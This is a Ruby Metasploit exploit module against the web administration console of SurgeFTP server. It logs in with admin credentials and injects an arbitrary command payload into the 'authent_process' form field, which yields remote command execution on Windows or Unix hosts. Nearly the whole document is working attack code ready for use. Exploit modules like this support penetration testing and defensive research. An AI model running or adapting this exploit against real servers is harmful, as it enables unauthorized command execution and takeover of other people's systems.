
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;SurgeFTP Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a flaw in the SurgeFTP server&#039;s web-based
        administrative console to execute arbitary commands.
      },
      &#039;Author&#039;  => 
        [
          &#039;Spencer McIntyre&#039;,
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
        ],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Platform&#039;       => [&#039;unix&#039;, &#039;win&#039;],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 1024,
          &#039;DisableNops&#039; => true,
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows&#039;, { &#039;modifier&#039; => "%s" }, ],
          [ &#039;Unix&#039;, { &#039;modifier&#039; => "/bin/sh -c \"%s\"" }, ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Dec 06 2012&#039;))
      
    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;The username with admin role to authenticate as&#039;, &#039;admin&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ true, &#039;The password for the specified username&#039;, &#039;password&#039; ]),
      ], self.class)

  end

  def exploit
    user_pass = Rex::Text.encode_base64(datastore[&#039;USERNAME&#039;] + ":" + datastore[&#039;PASSWORD&#039;])
    command = target[&#039;modifier&#039;] % payload.encoded
    print_status("Invoking command")
    
    res = send_request_cgi(
    {
      &#039;uri&#039;     => &#039;/cgi/surgeftpmgr.cgi&#039;,
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;headers&#039; =>
        {
        &#039;Authorization&#039; => "Basic #{user_pass}",
        },
      &#039;vars_post&#039; =>
        {
          &#039;global_smtp&#039; => "",
          &#039;global_restart&#039; => "",
          &#039;global_style&#039; => "",
          &#039;global_bind&#039; => "",
          &#039;global_passive_ip&#039; => "",
          &#039;global_passive_match&#039; => "",
          &#039;global_logon_mode&#039; => "",
          &#039;global_log_host&#039; => "",
          &#039;global_login_error&#039; => "",
          &#039;global_adminip&#039; => "",
          &#039;global_total_users&#039; => "",
          &#039;global_con_perip&#039; => "",
          &#039;global_ssl&#039; => "",
          &#039;global_ssl_cipher_list&#039; => "",
          &#039;global_implicit_port&#039; => "",
          &#039;log_level&#039; => "",
          &#039;log_home&#039; => "",
          &#039;global_watcher_program_ul&#039; => "",
          &#039;global_watcher_program_dl&#039; => "",
          &#039;authent_process&#039; => command,
          &#039;authent_cmdopts&#039; => "",
          &#039;authent_number&#039; => "",
          &#039;authent_domain&#039; => "",
          &#039;global_strip_user_domain&#039; => "",
          &#039;global_noclass&#039; => "",
          &#039;global_anon_hammer_over_time&#039; => "",
          &#039;global_anon_hammer_max&#039; => "",
          &#039;global_anon_hammer_block_time&#039; => "",
          &#039;global_port&#039; => "",
          &#039;global_mgr_port&#039; => "",
          &#039;global_mgr_ssl_port&#039; => "",
          &#039;cmd_global_save.x&#039; => "36",
          &#039;cmd_global_save.y&#039; => "8",
        }
    })
    
    if not (res and res.code == 200)
      print_error("Failed to execute command")
    else
      print_status("Done")
    end
  end
end

